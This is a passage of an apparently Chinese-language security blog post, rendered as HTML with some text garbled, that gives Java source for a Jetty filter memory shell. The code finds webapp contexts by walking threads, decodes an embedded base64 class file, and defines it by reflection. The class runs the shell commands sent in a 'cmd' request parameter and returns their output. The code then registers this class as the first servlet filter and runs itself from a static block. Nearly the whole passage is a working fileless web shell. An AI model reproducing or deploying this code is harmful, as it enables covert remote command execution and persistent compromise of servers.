class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;yv66vgAAADQAtgoAJwBjBwBkBwBlCABmCwBnAGgHAGkIAGoIAGsIAGwKAG0AbgoAbQBvCgBwAHEHAHIKAA0AcwgAdAoADQB1CgANAHYKAA0AdwgAeAgAeQsAAwB6CwADAHsKAHwAfQoAfAB+CgB8AH8HAIALAAMAgQcAggoAHABjCACDCgAcAIQKABoAhQoAHACGCwCHAIgIAIkIAIoLAAMAiwcAjAcAjQcAjgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTEpldHR5RmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAI8BAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZpc1VuaXgBAAFaAQAEY21kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAJpbgEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAXMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAGb3V0cHV0AQASTGphdmEvbGFuZy9TdHJpbmc7AQADb3V0AQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEAB3JlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAVjaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAC2h0dHBSZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAMaHR0cFJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHAGQHAGUHADsHAJAHAHIHAGkHAIwHAJEHAJIHAJMHAIAHAJQBAAdkZXN0cm95AQAHc2V0TmFtZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAEbmFtZQEAClNvdXJjZUZpbGUBABBKZXR0eUZpbHRlci5qYXZhDAApACoBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAANjbWQHAJEMAJUAXwEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQACL2MHAJYMAJcAmAwAmQCaBwCbDACcAJ0BABFqYXZhL3V0aWwvU2Nhbm5lcgwAKQCeAQACXGEMAJ8AoAwAoQCiDACjAKQBAAABABh0ZXh0L3BsYWluO2NoYXJzZXQ9VVRGLTgMAKUApgwApwCoBwCpDACqAKYMAKsAKgwArAAqAQATamF2YS9pby9JT0V4Y2VwdGlvbgwArQCuAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIBABTlkb3ku6TmiafooYzplJnor686IAwArwCwDACxAKQMALIApAcAkwwANgCzAQAOWC1Qcm9jZXNzZWQtQnkBABFTaW1wbGVKZXR0eUZpbHRlcgwAtAC1AQALSmV0dHlGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAE2phdmEvbGFuZy9UaHJvd2FibGUBAAxnZXRQYXJhbWV0ZXIBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAA5zZXRDb250ZW50VHlwZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BAAVmbHVzaAEABWNsb3NlAQAJc2V0U3RhdHVzAQAEKEkpVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACmdldE1lc3NhZ2UBAAh0b1N0cmluZwEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAlzZXRIZWFkZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYAIQAmACcAAQAoAAAABQABACkAKgABACsAAAAvAAEAAQAAAAUqtwABsQAAAAIALAAAAAYAAQAAAAsALQAAAAwAAQAAAAUALgAvAAAAAQAwADEAAgArAAAANQAAAAIAAAABsQAAAAIALAAAAAYAAQAAABAALQAAABYAAgAAAAEALgAvAAAAAAABADIAMwABADQAAAAEAAEANQABADYANwACACsAAAKRAAUADQAAARcrwAACOgQswAADOgUrEgS5AAUCAMYA3AQ2BhUGmQAfBr0ABlkDEgdTWQQSCFNZBSsSBLkABQIAU6cAHAa9AAZZAxIEU1kEEglTWQUrEgS5AAUCAFM6B7gAChkHtgALtgAMOgi7AA1ZGQi3AA4SD7YAEDoJGQm2ABGZAAsZCbYAEqcABRITOgoZBRIUuQAVAgAZBbkAFgEAOgsZCxkKtgAXGQu2ABgZC7YAGbE6BhkFEhS5ABUCABkFEQH0uQAbAgAZBbkAFgEAOgcZB7sAHFm3AB0SHrYAHxkGtgAgtgAftgAhtgAXGQe2ABgZB7YAGbEtKyy5ACIDABkFEiMSJLkAJQMApwATOgwZBRIjEiS5ACUDABkMv7EAAwAXAKoAqwAaAPAA+AEGAAABBgEIAQYAAAADACwAAAByABwAAAAUAAYAFQAMABgAFwAaABoAGwBWABwAYwAdAHMAHgCHACEAkAAiAJkAIwCgACQApQAlAKoAKACrACkArQArALYALADAAC0AyQAuAOUALwDqADAA7wAxAPAANwD4ADoBAwA7AQYAOgETADsBFgA8AC0AAACOAA4AGgCRADgAOQAGAFYAVQA6ADsABwBjAEgAPAA9AAgAcwA4AD4APwAJAIcAJABAAEEACgCZABIAQgBDAAsAyQAnAEIAQwAHAK0AQwBEAEUABgAAARcALgAvAAAAAAEXAEYARwABAAABFwBIAEkAAgAAARcASgBLAAMABgERAEwATQAEAAwBCwBOAE8ABQBQAAAARAAI/gA7BwBRBwBSAVgHAFP+AC4HAFMHAFQHAFVBBwBW/wAlAAYHAFcHAFgHAFkHAFoHAFEHAFIAAQcAW/sARFUHAFwPADQAAAAGAAIAGgA1AAEAXQAqAAEAKwAAACsAAAABAAAAAbEAAAACACwAAAAGAAEAAABBAC0AAAAMAAEAAAABAC4ALwAAAAEAXgBfAAEAKwAAADYAAQACAAAAAiuwAAAAAgAsAAAABgABAAAAQwAtAAAAFgACAAAAAgAuAC8AAAAAAAIAYABBAAEAAQBhAAAAAgBi&quot;</span>;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inject</span><span class="hljs-params">(Object context, Object filter)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">servletHandler</span> <span class="hljs-operator">=</span> getFieldValue(context, <span class="hljs-string">&quot;_servletHandler&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (servletHandler != <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isInjected(servletHandler)) &#123;  <br>                <span class="hljs-type">PrintStream</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> System.out;  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filter is already injected&quot;</span>;  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                Class&lt;?&gt; filterHolderClass = <span class="hljs-literal">null</span>;  <br>  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    filterHolderClass = context.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;org.eclipse.jetty.servlet.FilterHolder&quot;</span>);  <br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var7) &#123;  <br>                    filterHolderClass = context.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;org.mortbay.jetty.servlet.FilterHolder&quot;</span>);  <br>                &#125;  <br>  <br>                Constructor&lt;?&gt; constructor = filterHolderClass.getConstructor(Class.class);  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">filterHolder</span> <span class="hljs-operator">=</span> constructor.newInstance(filter.getClass());  <br>                invokeMethod(filterHolder, <span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-built_in">this</span>.getClassName()&#125;);  <br>                invokeMethod(servletHandler, <span class="hljs-string">&quot;addFilterWithMapping&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;filterHolderClass, String.class, Integer.TYPE&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;filterHolder, <span class="hljs-built_in">this</span>.getUrlPattern(), <span class="hljs-number">1</span>&#125;);  <br>                <span class="hljs-built_in">this</span>.moveFilterToFirst(servletHandler);  <br>                invokeMethod(servletHandler, <span class="hljs-string">&quot;invalidateChainsCache&quot;</span>);  <br>                <span class="hljs-type">PrintStream</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> System.out;  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">var10001</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filter added successfully&quot;</span>;  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">moveFilterToFirst</span><span class="hljs-params">(Object servletHandler)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">filterMaps</span> <span class="hljs-operator">=</span> getFieldValue(servletHandler, <span class="hljs-string">&quot;_filterMappings&quot;</span>);  <br>        ArrayList&lt;Object&gt; reorderedFilters = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();  <br>        <span class="hljs-keyword">if</span> (filterMaps.getClass().isArray()) &#123;  <br>            <span class="hljs-type">int</span> <span class="hljs-variable">filterLength</span> <span class="hljs-operator">=</span> Array.getLength(filterMaps);  <br>  <br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; filterLength; ++i) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">filter</span> <span class="hljs-operator">=</span> Array.get(filterMaps, i);  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">filterName</span> <span class="hljs-operator">=</span> (String)getFieldValue(filter, <span class="hljs-string">&quot;_filterName&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (filterName.equals(<span class="hljs-built_in">this</span>.getClassName())) &#123;  <br>                    reorderedFilters.add(<span class="hljs-number">0</span>, filter);  <br>                &#125; <span class="hljs-keyword">else</span> &#123;  <br>                    reorderedFilters.add(filter);  <br>                &#125;  <br>            &#125;  <br>  <br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; filterLength; ++i) &#123;  <br>                Array.set(filterMaps, i, reorderedFilters.get(i));  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">if</span> (!(filterMaps <span class="hljs-keyword">instanceof</span> ArrayList)) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;filterMaps must be either an array or an ArrayList&quot;</span>);  <br>            &#125;  <br>  <br>            ArrayList&lt;Object&gt; filterList = (ArrayList)filterMaps;  <br>            <span class="hljs-type">int</span> <span class="hljs-variable">filterLength</span> <span class="hljs-operator">=</span> filterList.size();  <br>  <br>            <span class="hljs-keyword">for</span>(Object filter : filterList) &#123;  <br>                <span class="hljs-type">String</span> <span class="hljs-variable">filterName</span> <span class="hljs-operator">=</span> (String)getFieldValue(filter, <span class="hljs-string">&quot;_filterName&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (filterName.equals(<span class="hljs-built_in">this</span>.getClassName())) &#123;  <br>                    reorderedFilters.add(<span class="hljs-number">0</span>, filter);  <br>                &#125; <span class="hljs-keyword">else</span> &#123;  <br>                    reorderedFilters.add(filter);  <br>                &#125;  <br>            &#125;  <br>  <br>            filterList.clear();  <br>            filterList.addAll(reorderedFilters);  <br>        &#125;  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; <span class="hljs-title function_">getContext</span><span class="hljs-params">()</span> &#123;  <br>        List&lt;Object&gt; contexts = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();  <br>        Thread[] threads = (Thread[])Thread.getAllStackTraces().keySet().toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>[<span class="hljs-number">0</span>]);  <br>  <br>        <span class="hljs-keyword">for</span>(Thread thread : threads) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">contextClassLoader</span> <span class="hljs-operator">=</span> invokeMethod(thread, <span class="hljs-string">&quot;getContextClassLoader&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (contextClassLoader.getClass().getName().contains(<span class="hljs-string">&quot;WebAppClassLoader&quot;</span>)) &#123;  <br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> getFieldValue(contextClassLoader, <span class="hljs-string">&quot;_context&quot;</span>);  <br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getFieldValue(context, <span class="hljs-string">&quot;_servletHandler&quot;</span>);  <br>                    contexts.add(getFieldValue(handler, <span class="hljs-string">&quot;_contextHandler&quot;</span>));  <br>                &#125; <span class="hljs-keyword">else</span> &#123;  <br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">threadLocals</span> <span class="hljs-operator">=</span> getFieldValue(thread, <span class="hljs-string">&quot;threadLocals&quot;</span>);  <br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> getFieldValue(threadLocals, <span class="hljs-string">&quot;table&quot;</span>);  <br>  <br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; Array.getLength(table); ++i) &#123;  <br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> Array.get(table, i);  <br>                        <span class="hljs-keyword">if</span> (entry != <span class="hljs-literal">null</span>) &#123;  <br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">httpConnection</span> <span class="hljs-operator">=</span> getFieldValue(entry, <span class="hljs-string">&quot;value&quot;</span>);  <br>                            <span class="hljs-keyword">if</span> (httpConnection != <span class="hljs-literal">null</span> &amp;&amp; httpConnection.getClass().getName().contains(<span class="hljs-string">&quot;HttpConnection&quot;</span>)) &#123;  <br>                                <span class="hljs-type">Object</span> <span class="hljs-variable">httpChannel</span> <span class="hljs-operator">=</span> invokeMethod(httpConnection, <span class="hljs-string">&quot;getHttpChannel&quot;</span>);  <br>                                <span class="hljs-type">Object</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> invokeMethod(httpChannel, <span class="hljs-string">&quot;getRequest&quot;</span>);  <br>                                <span class="hljs-type">Object</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> invokeMethod(request, <span class="hljs-string">&quot;getSession&quot;</span>);  <br>                                <span class="hljs-type">Object</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> invokeMethod(session, <span class="hljs-string">&quot;getServletContext&quot;</span>);  <br>                                contexts.add(getFieldValue(servletContext, <span class="hljs-string">&quot;this$0&quot;</span>));  <br>                            &#125;  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br>            &#125; <span class="hljs-keyword">catch</span> (Exception var17) &#123;  <br>            &#125;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> contexts;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">getShell</span><span class="hljs-params">(Object context)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();  <br>        <span class="hljs-keyword">if</span> (classLoader == <span class="hljs-literal">null</span>) &#123;  <br>            classLoader = context.getClass().getClassLoader();  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-keyword">return</span> classLoader.loadClass(<span class="hljs-built_in">this</span>.getClassName()).newInstance();  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;  <br>            <span class="hljs-type">byte</span>[] clazzByte = (decodeBase64(<span class="hljs-built_in">this</span>.getBase64String()));  <br>            <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, Integer.TYPE, Integer.TYPE);  <br>            defineClass.setAccessible(<span class="hljs-literal">true</span>);  <br>            Class&lt;?&gt; clazz = (Class)defineClass.invoke(classLoader, clazzByte, <span class="hljs-number">0</span>, clazzByte.length);  <br>            <span class="hljs-keyword">return</span> clazz.newInstance();  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isInjected</span><span class="hljs-params">(Object servletHandler)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">filterMappings</span> <span class="hljs-operator">=</span> getFieldValue(servletHandler, <span class="hljs-string">&quot;_filterMappings&quot;</span>);  <br>        <span class="hljs-keyword">if</span> (filterMappings == <span class="hljs-literal">null</span>) &#123;  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            Object[] filterMaps = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>];  <br>            <span class="hljs-keyword">if</span> (filterMappings <span class="hljs-keyword">instanceof</span> List) &#123;  <br>                filterMaps = ((List)filterMappings).toArray();  <br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (filterMappings <span class="hljs-keyword">instanceof</span> Object[]) &#123;  <br>                filterMaps = (Object[]) filterMappings;  <br>            &#125;  <br>  <br>            <span class="hljs-keyword">for</span>(Object filterMap : filterMaps) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">filterName</span> <span class="hljs-operator">=</span> getFieldValue(filterMap, <span class="hljs-string">&quot;_filterName&quot;</span>);  <br>                <span class="hljs-keyword">if</span> (filterName.equals(<span class="hljs-built_in">this</span>.getClassName())) &#123;  <br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <br>                &#125;  <br>            &#125;  <br>  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] decodeBase64(String base64Str) <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Class&lt;?&gt; decoderClass = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> decoderClass.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>);  <br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.class).invoke(decoder, base64Str);  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception var3) &#123;  <br>            Class&lt;?&gt; decoderClass = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);  <br>            <span class="hljs-keyword">return</span> (<span class="hljs-type">byte</span>[])decoderClass.getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, String.class).invoke(decoderClass.newInstance(), base64Str);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] gzipDecompress(<span class="hljs-type">byte</span>[] compressedData) <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br>        <span class="hljs-type">GZIPInputStream</span> <span class="hljs-variable">gzipInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>  <br>        <span class="hljs-type">byte</span>[] var5;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            gzipInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GZIPInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(compressedData));  <br>            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4096</span>];  <br>  <br>            <span class="hljs-type">int</span> n;  <br>            <span class="hljs-keyword">while</span>((n = gzipInputStream.read(buffer)) &gt; <span class="hljs-number">0</span>) &#123;  <br>                out.write(buffer, <span class="hljs-number">0</span>, n);  <br>            &#125;  <br>  <br>            var5 = out.toByteArray();  <br>        &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">if</span> (gzipInputStream != <span class="hljs-literal">null</span>) &#123;  <br>                gzipInputStream.close();  <br>            &#125;  <br>  <br>            out.close();  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> var5;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object obj, String name)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;  <br>        <span class="hljs-keyword">for</span>(Class&lt;?&gt; clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(name);  <br>                field.setAccessible(<span class="hljs-literal">true</span>);  <br>                <span class="hljs-keyword">return</span> field.get(obj);  <br>            &#125; <span class="hljs-keyword">finally</span> &#123;  <br>  <br>            &#125;  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchFieldException</span>(name);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(Object targetObject, String methodName)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException &#123;  <br>        <span class="hljs-keyword">return</span> invokeMethod(targetObject, methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>], <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]);  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">invokeMethod</span><span class="hljs-params">(Object obj, String methodName, Class&lt;?&gt;[] paramClazz, Object[] param)</span> <span class="hljs-keyword">throws</span> NoSuchMethodException &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Class&lt;?&gt; clazz = obj <span class="hljs-keyword">instanceof</span> Class ? (Class)obj : obj.getClass();  <br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br>  <br>            <span class="hljs-keyword">while</span>(clazz != <span class="hljs-literal">null</span> &amp;&amp; method == <span class="hljs-literal">null</span>) &#123;  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    <span class="hljs-keyword">if</span> (paramClazz == <span class="hljs-literal">null</span>) &#123;  <br>                        method = clazz.getDeclaredMethod(methodName);  <br>                    &#125; <span class="hljs-keyword">else</span> &#123;  <br>                        method = clazz.getDeclaredMethod(methodName, paramClazz);  <br>                    &#125;  <br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException var7) &#123;  <br>                    clazz = clazz.getSuperclass();  <br>                &#125;  <br>            &#125;  <br>  <br>            <span class="hljs-keyword">if</span> (method == <span class="hljs-literal">null</span>) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchMethodException</span>(<span class="hljs-string">&quot;Method not found: &quot;</span> + methodName);  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                method.setAccessible(<span class="hljs-literal">true</span>);  <br>                <span class="hljs-keyword">return</span> method.invoke(obj <span class="hljs-keyword">instanceof</span> Class ? <span class="hljs-literal">null</span> : obj, param);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;  <br>            <span class="hljs-keyword">throw</span> e;  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Error invoking method: &quot;</span> + methodName, e);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-keyword">static</span> &#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">JettyFilterMemoryShell</span>();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢é‚£ä¸ªJettyFilter.classå­—èŠ‚ç ç”±ä¸‹é¢çš„payloadä¸€é”®å¾—å‡ºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 